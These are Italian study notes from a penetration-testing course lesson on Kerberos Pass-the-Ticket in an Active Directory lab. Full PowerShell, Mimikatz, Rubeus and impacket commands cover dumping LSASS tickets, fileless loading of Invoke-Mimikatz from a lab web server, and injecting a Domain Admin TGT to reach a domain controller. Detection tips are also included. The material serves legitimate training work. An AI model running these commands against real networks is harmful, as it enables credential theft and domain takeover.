# 013 — AD Lateral Movement: Pass-the-Ticket (Active Directory Penetration Testing)

> **Modulo:** Active Directory Penetration Testing · **Video:** 13/15
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [013_AD Lateral Movement_ Pass-the-Ticket.txt](013_AD Lateral Movement_ Pass-the-Ticket.txt) · [013_AD Lateral Movement_ Pass-the-Ticket.srt](013_AD Lateral Movement_ Pass-the-Ticket.srt)

## Concetti chiave

- **Pass-the-Ticket (PtT)** = riusare un **ticket Kerberos rubato (TGT o TGS)** per autenticarsi come un altro utente **senza conoscere la password**.
- Si possono iniettare ticket sia **TGT** (accesso a qualsiasi risorsa Kerberos) sia **TGS** (accesso a uno specifico servizio).
- Senza privilegi admin: si possono estrarre TGT con tecniche tipo **fake delegation** e tutti i TGS del proprio user.
- Con privilegi admin: si può **dumpare LSASS** e ottenere **tutti i TGT/TGS cached** sul sistema (tutti gli utenti loggati).
- Workflow del lab: **enum → local admin discovery → PSRemoting → export tickets (Mimikatz `sekurlsa::tickets /export`) → `kerberos::ptt` → accesso al DC**.
- Risultato dimostrato: estratto ticket di `Maintainer` (DA), iniettato in sessione → accesso al DC `prod.research.security.local`.

## Spiegazione approfondita

### PtH vs PtT
- **PtH**: usa hash NTLM via NTLM/SMB.
- **PtT**: usa ticket Kerberos via Kerberos.

Conseguenza pratica: PtT funziona anche in ambienti che hanno disabilitato NTLM e si appoggiano solo a Kerberos. È spesso più stealthy perché un ticket valido è esattamente quello che il KDC si aspetta di vedere usato.

### Cosa puoi rubare in base ai privilegi
| Privilegi sul sistema | Ticket accessibili | Tecniche |
|---|---|---|
| **User normale** | Solo i ticket della sessione corrente (i propri TGS, e TGT via tecniche tipo *fake delegation*) | Limitato al proprio user |
| **Admin / SYSTEM** | Tutti i TGT/TGS in **LSASS** di tutti gli utenti loggati | `sekurlsa::tickets`, `sekurlsa::tickets /export` |

### Tipi di ticket
- **TGT** = "passepartout" Kerberos. Iniettato → puoi richiedere TGS per qualunque servizio nei domini in cui è valido. È il più potente.
- **TGS** = ticket per **uno specifico servizio**. Iniettato → accesso a quel servizio (es. CIFS/host = share SMB di quell'host).

### Scenario del lab
```
[student@client]
  └── Find-LocalAdminAccess  → seclogs, client
       └── Enter-PSSession seclogs           (admin lì)
            └── IEX Invoke-Mimikatz.ps1     (hosted via HFS su client)
                 └── sekurlsa::tickets /export   (dumpa tutti i .kirbi)
                      └── kerberos::ptt <Maintainer@KRBTGT...kirbi>   (TGT del DA)
                           └── klist (verifica)
                                └── ls \\prod.research.security.local\C$   ✓ accesso al DC
```

### Step-by-step
1. **PowerShell elevata** sul foothold (`client`):
   ```powershell
   powershell -ep bypass
   cd C:\Tools
   . .\PowerView.ps1
   ```
2. **Trova host con local admin** (importante: il fatto di essere in shell elevata fa apparire anche `client` come admin):
   ```powershell
   Find-LocalAdminAccess
   # -> seclogs, client
   ```
3. **PSRemoting su seclogs**:
   ```powershell
   Enter-PSSession -ComputerName seclogs.research.security.local
   whoami; whoami /priv
   ```
4. **HFS su client** ospita `Invoke-Mimikatz.ps1`.
5. **Da seclogs, in-memory load di Mimikatz**:
   ```powershell
   IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")
   ```
6. **Export di tutti i ticket cached**:
   ```powershell
   Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
   ls | Select Name
   # File .kirbi tipo:
   #   [0;3e7]-2-1-40e10000-Maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
   #   ...altri ticket per host SecLogs, DC12, ecc.
   ```
7. **Inject del TGT (Pass-the-Ticket)**:
   ```powershell
   Invoke-Mimikatz -Command '"kerberos::ptt [0;3e7]-2-1-40e10000-Maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"'
   ```
   Il ticket viene iniettato nella sessione Kerberos corrente → ora sei effettivamente `Maintainer` (Domain Admin).
8. **Verifica con `klist`**:
   ```powershell
   klist
   # Mostra client = maintainer@research.security.local, renew till, flags, enc type
   ```
9. **Test accesso DC**:
   ```powershell
   ls \\prod.research.security.local\C$
   # Lista C: del DC -> game over
   ```

### Cosa significa l'inject
Il ticket viene caricato nella **memory area Kerberos** della sessione attuale. Da quel momento, ogni autenticazione Kerberos uscente userà quel ticket → l'OS impersonifica trasparentemente l'utente proprietario del ticket. Nessuna password necessaria.

### Ticket attributes da osservare in `klist`
- **Start/End/Renew time** — quanto è ancora valido (default TGT: 10h, renew 7 giorni).
- **Flags** — `forwardable, renewable, pre_authent, ...`.
- **EncryptionType** — `aes256_hmac` è il moderno; `rc4_hmac` è il "vecchio" e più facile da spoofare/golden-ticketare.
- **Server** — per un TGT è `krbtgt/DOMAIN`.

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `Find-LocalAdminAccess` | PowerView | Identifica host dove sei admin |
| `Enter-PSSession -ComputerName <host>` | Remoting | WinRM |
| `IEX(New-Object Net.WebClient).DownloadString("<url>")` | In-memory script load | Fileless |
| `Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'` | Export di tutti i ticket cached in `.kirbi` | Serve admin |
| `Invoke-Mimikatz -Command '"kerberos::ptt <file.kirbi>"'` | Pass-the-Ticket inject | Sintassi esatta del lab |
| `klist` | Lista ticket Kerberos della sessione | Per verificare l'inject |
| `ls \\<DC>\C$` | Verifica accesso SMB al DC | Test "game over" |

## Esempi pratici

```powershell
# === Sul client come Admin PowerShell ===
powershell -ep bypass
cd C:\Tools
. .\PowerView.ps1
Find-LocalAdminAccess

# === Remoting al pivot ===
Enter-PSSession -ComputerName seclogs.research.security.local
whoami /priv

# === Su seclogs: carica Mimikatz da HFS sul client ===
IEX(New-Object Net.WebClient).DownloadString("http://10.0.5.101/Invoke-Mimikatz.ps1")

# === Esporta TUTTI i ticket Kerberos cached ===
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
ls *.kirbi | Select Name
# Cerca un ticket "@krbtgt" di un utente privilegiato (es. Maintainer)

# === Pass-the-Ticket: inject del TGT ===
Invoke-Mimikatz -Command '"kerberos::ptt [0;3e7]-2-1-40e10000-Maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"'

# === Verifica ===
klist
ls \\prod.research.security.local\C$    # accesso al DC come Maintainer
```

```bash
# Equivalenti su Linux (impacket / Rubeus alternatives)
# Da Linux con un .ccache:
export KRB5CCNAME=/path/to/maintainer.ccache
impacket-psexec -k -no-pass research.security.local/maintainer@prod.research.security.local

# Da Windows con Rubeus (sostituto moderno di Mimikatz per Kerberos):
Rubeus.exe dump                              # lista ticket
Rubeus.exe ptt /ticket:<base64_or_kirbi>     # pass-the-ticket
```

## Punti d'attenzione per l'esame eCPPT

- **PtT = Kerberos**, **PtH = NTLM**. Domanda quasi certa.
- I ticket dumpabili stanno in **LSASS** → serve **admin/SYSTEM** + `SeDebugPrivilege` per arrivarci.
- **TGT vs TGS rubato**:
  - TGT = riusabile per richiedere TGS per qualsiasi servizio (più potente).
  - TGS = vincolato al servizio specifico (più limitato).
- **Sintassi Mimikatz da memorizzare**:
  - Export: `sekurlsa::tickets /export`
  - Inject: `kerberos::ptt <ticket.kirbi>`
- **`klist`** = comando nativo per verificare i ticket nella sessione corrente.
- Differenza con **Overpass-the-Hash** (non trattato in dettaglio nel video): OPtH usa l'**NT hash** per richiedere un nuovo TGT al KDC; PtT usa un **ticket già emesso**.
- **Ticket lifetime**: TGT vive 10h, rinnovabile fino a 7 giorni di default. È la finestra in cui un PtT funziona prima di scadere.
- **Encryption type del ticket**: se RC4 = vulnerabile a Kerberoasting più facile / Golden Ticket "rumoroso"; se AES256 = più moderno. Default detection rules cercano TGT RC4 con flag specifici.
- Anche **senza admin** un utente può PtT con i propri TGS (limitato), oppure con tecniche di **delegation abuse** (fake delegation menzionato nel video).
- **CVE / detections**: monitorare event 4624 (logon) senza event 4768 (TGT request) corrispondente è un IOC classico di PtT.
- Tool moderno raccomandato al posto di Mimikatz: **Rubeus** (`dump`, `ptt`, `asktgt`, `asktgs`).

## Collegamenti con altri video

- Precedente: [[012_AD Lateral Movement_ Pass-the-Hash]] — l'analogo NTLM.
- Prossimo: [[014_AD Persistence_ Golden Ticket]] — forgia di TGT (estremizzazione del PtT).
- Teoria TGT/TGS e cifrature: [[04_Active Directory Authentication]]
- Silver Ticket = forgia di TGS: [[015_AD Persistence_ Silver Ticket]]
- BloodHound per individuare path: [[08_AD Enumeration_ BloodHound]]
